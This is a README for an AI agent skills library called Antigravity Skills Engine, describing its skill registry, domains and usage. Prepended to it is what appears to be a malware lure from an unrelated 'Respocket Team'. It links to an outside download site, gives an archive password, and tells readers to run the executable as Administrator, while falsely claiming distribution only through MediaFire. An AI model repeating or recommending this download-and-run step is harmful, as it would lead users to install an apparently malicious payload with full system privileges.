<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# ⚡ Antigravity Skills Engine (ASE)

> **Antigravity Skills Engine (ASE)** is a high-performance **AI Agent Skills Library** and **Workflow Engine**. It transforms a single LLM into an industrial-grade **Expert System** through a dynamic registry of specialized skills. It acts as the **Central Nervous System** for your AI Agent.

**Version**: 3.2.0 | **Status**: Production Ready | **License**: MIT

---

## 🏛️ Core Architecture: Registry V3

ASE 3.x introduces a **Category-based Registry Architecture** that organizes 15+ skills into 5 strategic domains. The `/ase` hyper-workflow dynamically reads this registry to discover, identify, and activate the appropriate expert for any task.

### 🗂️ The 5 Domains of Expertise

| Code | Domain | Focus | Skills Count |
| :--- | :--- | :--- | :---: |
| **1-dev** | 🔧 DEV (Development) | Feature architecture, fullstack guide, session lifecycle | 3 |
| **2-audit** | 🔍 AUDIT (Quality) | Code auditing, scientific debugging, webapp testing | 3 |
| **3-sys** | ⚙️ SYS (System) | Ecosystem management, skills management, doc bootstrapping, MCP building | 4 |
| **4-tools** | 🛠️ TOOLS (Utilities) | Doc writing, visual designing, PPTX creating | 3 |
| **external** | 🌐 EXTERNAL (Dependencies) | Brand guidelines, internal comms, meeting insights | 3 |

### 📋 Full Skills Registry

<details>
<summary><b>1-dev: Development Domain</b></summary>

| ID | Skill | Description |
| :--- | :--- | :--- |
| 1.1 | `architecting` | Architects new features through the full lifecycle (design → plan → implement) |
| 1.2 | `fullstack-guide` | Fullstack development encyclopedia (React/TS/Node/Supabase) |
| 1.3 | `session-managing` | Auto-triggered session lifecycle management (INHERIT + DEPOSIT) |

</details>

<details>
<summary><b>2-audit: Audit Domain</b></summary>

| ID | Skill | Description |
| :--- | :--- | :--- |
| 2.1 | `code-auditing` | Systematic auditing & code optimization (Code Review / Simplifier / Council) |
| 2.2 | `scientific-debugging` | Scientific debugging: Observe → Hypothesize → Experiment → Fix |
| 2.3 | `webapp-testing` | Playwright-based toolkit for testing local web applications |

</details>

<details>
<summary><b>3-sys: System Domain</b></summary>

| ID | Skill | Description |
| :--- | :--- | :--- |
| 3.1 | `ecosystem-managing` | System ecosystem engineer (Release / Maintain / Purge) |
| 3.2 | `skills-managing` | Create and manage ASE skills following best practices |
| 3.3 | `doc-bootstrapping` | One-click project documentation system initialization |
| 3.4 | `mcp-building` | Guide for creating high-quality MCP servers |

</details>

<details>
<summary><b>4-tools: Tools Domain</b></summary>

| ID | Skill | Description |
| :--- | :--- | :--- |
| 4.1 | `doc-writing` | Technical doc engineering (Diátaxis / PDF / DOCX / XLSX) |
| 4.2 | `visual-designing` | Visual design toolbox (Canvas / Themes / Design System / Artifacts) |
| 4.3 | `pptx-creating` | PPTX presentation creation, editing & analysis (html2pptx / OOXML) |

</details>

<details>
<summary><b>external: External Dependencies</b></summary>

| ID | Skill | Description |
| :--- | :--- | :--- |
| E.1 | `brand-guidelines` | Official brand colors and typography |
| E.2 | `internal-comms` | Internal communications templates (status reports, newsletters, etc.) |
| E.3 | `meeting-insights-analyzer` | Behavioral patterns and communication insights from meetings |

</details>

## 📂 Project Structure

```text
.agent/
├── skills/
│   ├── registry.json           # Single Source of Truth (V3)
│   ├── 1-dev/                  # Development Domain
│   │   ├── architecting/
│   │   ├── fullstack-guide/
│   │   └── session-managing/
│   ├── 2-audit/                # Audit Domain
│   │   ├── code-auditing/
│   │   ├── scientific-debugging/
│   │   └── webapp-testing/
│   ├── 3-sys/                  # System Domain
│   │   ├── doc-bootstrapping/
│   │   ├── ecosystem-managing/
│   │   ├── mcp-building/
│   │   └── skills-managing/
│   ├── 4-tools/                # Tools Domain
│   │   ├── doc-writing/
│   │   └── visual-designing/
│   └── external/               # External Dependencies
│       ├── brand-guidelines/
│       ├── internal-comms/
│       └── meeting-insights-analyzer/
└── workflows/
    └── ase.md                  # The /ase Hyper-Workflow (Dynamic Router)
```

## 🛠️ Usage

### Invoke the Central Nervous System: `/ase`

Simply type `/ase` in your chat. The engine will enter **Discovery Mode**, scanning `registry.json` and presenting you with the Expert Matrix.

Then, ask naturally:

> *"Review my code for error handling bugs."*
> → Activates `code-auditing` → Code Review Mode

> *"Design a premium glassmorphism landing page."*
> → Activates `visual-designing` → Premium Mode

> *"Debug this intermittent crash."*
> → Activates `scientific-debugging` → Hypothesis-driven workflow

### Lifecycle Phases

The ASE operates through a structured lifecycle:

| Phase | Name | Purpose |
| :--- | :--- | :--- |
| -1 | **INHERIT** | Load project context (Rule1, Memory) |
| 0 | **IDENTIFY** | Match user intent to skill via registry |
| 1 | **EXECUTE** | Activate skill protocol with resources |
| F | **DEPOSIT** | Synthesize learnings, harvest reusable artifacts |

## 💎 Key Features (V3.1)

- **Category-based Organization**: Skills are grouped into logical domains with numerical prefixes for easy navigation
- **Protocol-First Design**: Skills enforce strict execution protocols with resource loading
- **Progressive Disclosure**: Heavy knowledge is offloaded to `resources/` files until needed
- **Auto-triggered Skills**: Certain skills (e.g., `session-managing`) activate automatically
- **Trace Mode**: Clear visibility into ASE execution with phase markers

## 🚀 Creating New Skills

Want to add a new expert?

1. Summon the **Skills Manager**: Invoke skill `3.2`
2. It will generate the standard `SKILL.md` and register it in `registry.json` automatically
3. The new skill is instantly available via `/ase`


---

MIT License

Copyright (c) 2026 Antigravity Lab

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
